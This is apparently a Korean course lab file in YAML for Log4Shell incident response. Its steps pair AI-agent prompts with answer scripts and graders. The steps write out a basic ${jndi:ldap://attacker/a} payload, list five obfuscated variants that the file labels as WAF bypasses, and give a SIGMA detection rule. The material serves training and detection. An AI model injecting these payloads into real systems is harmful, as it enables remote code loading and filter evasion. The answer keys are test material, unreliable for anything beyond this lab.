lab_id: agent-ir-adv-ai-week06
title: N-day 대규모 악용 (Log4Shell 계열) IR (AI 지원)
version: ai
course: agent-ir-adv-ai
week: 6
description: 공개 후 4시간 내 대응. Virtual Patch 2h / Emergency Patch 48h SLA. AI SubAgent 자동 실행·검증.
difficulty: hard
duration_minutes: 150
objectives:
- 공격 원리를 이해하고 재현한다
- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
- Human vs Agent 대응을 비교한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Log4Shell 페이로드 예시
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 9
  answer: '🤖 프롬프트: Log4Shell 페이로드 예시

    📎 참고 (CLI): echo ''${jndi:ldap://attacker/a}'' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt'
  answer_detail: '[공격] 기본 페이로드.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
    semantic:
      intent: Log4Shell 페이로드 — ${jndi:ldap://attacker.com/a} 또는 ${jndi:dns://...}. CVE-2021-44228 Log4j
        JNDI lookup 악용. User-Agent·X-Forwarded-For·URI 파라미터 등 다양한 주입점
      success_criteria:
      - ${jndi:...} 페이로드
      - CVE-2021-44228
      acceptable_methods:
      - curl -H + 페이로드
      negative_signs:
      - jndi 없음
  target_vm: web
  script: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
  risk_level: low
  bastion_prompt: Log4Shell 페이로드 예시
- order: 2
  instruction: 변형 페이로드 5종
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 10
  answer: '🤖 프롬프트: 변형 페이로드 5종

    📎 참고 (CLI): cat > /tmp/w06-variants.txt <<''T''

    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}

    ${${lower:j}ndi:ldap://attacker/a}

    ${${env:BARFOO:-j}ndi:ldap://attacker/a}

    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}

    ${jndi:ldap://${::-attacker}/a}

    T

    cat /tmp/w06-variants.txt'
  answer_detail: '[공격] 변형으로 WAF 우회.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
    semantic:
      intent: 변형 페이로드 5종 — (1) ${lower:j}ndi (2) ${${env:x:-j}}ndi (3) ${${:-j}${:-n}${:-d}${:-i}} (4)
        URL encode %24%7Bjndi (5) Nested ${${::-j}ndi}. WAF bypass
      success_criteria:
      - 5 변형 페이로드
      - nested + encoding 조합
      acceptable_methods:
      - cat > file + 변형 목록
      negative_signs:
      - 변형 3 이하
  target_vm: web
  script: 'cat > /tmp/w06-variants.txt <<''T''

    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}

    ${${lower:j}ndi:ldap://attacker/a}

    ${${env:BARFOO:-j}ndi:ldap://attacker/a}

    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}

    ${jndi:ldap://${::-attacker}/a}

    T

    cat /tmp/w06-variants.txt'
  risk_level: low
  bastion_prompt: 변형 페이로드 5종
- order: 3
  instruction: Suricata/SIGMA 룰
  hint: 6단계 IR 중 탐지 단계. target_vm=siem.
  category: analysis
  points: 11
  answer: "\U0001F916 프롬프트: Suricata/SIGMA 룰\n\U0001F4CE 참고 (CLI): mkdir -p ~/w06 && cat > ~/w06/rule.yml\
    \ <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n    payload|contains: ['${jndi:',\
    \ '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\nY\ncat ~/w06/rule.yml"
  answer_detail: '[탐지] JNDI 패턴 탐지.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
    semantic:
      intent: 'Suricata/SIGMA 룰 — alert http ... content:${jndi: OR content:${${ OR pcre:/\$\{(?:lower|upper|env)/.
        정규식 기반 변형 커버. 실시간 탐지'
      success_criteria:
      - Suricata/SIGMA 룰
      - pcre 변형 커버
      acceptable_methods:
      - Suricata rule + pcre
      - SIGMA regex
      negative_signs:
      - 단순 ${jndi 만 (변형 놓침)
  target_vm: siem
  script: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n\
    \    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\n\
    Y\ncat ~/w06/rule.yml"
  risk_level: low
  bastion_prompt: Suricata/SIGMA 룰
